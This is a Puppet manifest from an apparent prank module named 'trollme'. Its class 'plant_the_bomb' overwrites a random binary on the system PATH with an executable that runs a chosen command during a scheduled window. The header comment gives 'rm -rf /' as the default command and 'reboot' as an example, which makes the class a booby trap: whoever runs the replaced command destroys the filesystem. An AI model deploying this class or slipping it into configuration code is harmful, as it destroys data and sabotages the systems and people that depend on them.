# == Class: trollme::plant_the_bomb
#
# Substitutes a random binary from path to a specified command.
#
# === Parameters
#
# What command to run instead.
#
# === Parameters:
#
# [*command*]
#   Specify a command line to execute.
#   Defaults to "rm -rf /"
#
# === Examples
#
#  class { 'trollme::plant_the_bomb':
#    command => 'reboot',
#  }
#
# === Authors
#
# Andre Ramoni
#
class trollme::plant_the_bomb (
  $command    = $::trollme::params::ptb_command,
  $file       = $::roulette_file_frompath,
  $time_range = $::trollme::params::ptb_time_range,
  $period     = $::trollme::params::ptb_period,
  $repeat     = $::trollme::params::ptb_repeat,
) inherits trollme::params {
  file { 'ptb_file':
    ensure   => file,
    path     => $file,
    mode     => '0755',
    content  => template('trollme/ptb/ptb.erb'),
    schedule => 'ptb_window',
  }
  schedule { 'ptb_window':
    range  => $time_range,
    period => $period,
    repeat => $repeat,
  }
}
